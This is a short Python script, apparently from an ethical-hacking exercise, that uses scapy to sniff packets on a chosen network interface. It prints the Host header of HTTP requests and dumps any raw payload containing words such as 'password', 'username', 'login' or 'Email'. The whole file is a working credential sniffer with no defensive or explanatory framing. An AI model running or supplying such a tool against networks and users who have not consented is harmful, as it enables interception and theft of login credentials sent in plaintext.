import scapy.all as scapy
import argparse

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packets)

def process_packets(packet):
    if packet.haslayer(scapy.TCP) and packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        try:
            load = load.decode('utf-8')
        except UnicodeDecodeError:
            load = load.decode('latin-1', errors='ignore')
        
        if "HTTP" in load:
            print("URL: " + extract_url(load))
            if any(word in load for word in words):
                print("Load: " + load)

def extract_url(payload):
    start = payload.find("Host: ") + 6
    end = payload.find("\r\n", start)
    return payload[start:end]

words = ["password", "user", "username", "login", "pass", "Username", "Password", "User", "Email"]


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Target interface")
    args = parser.parse_args()

    if args.interface:
        sniff(args.interface)
    else:
        print("Please provide a target interface.")





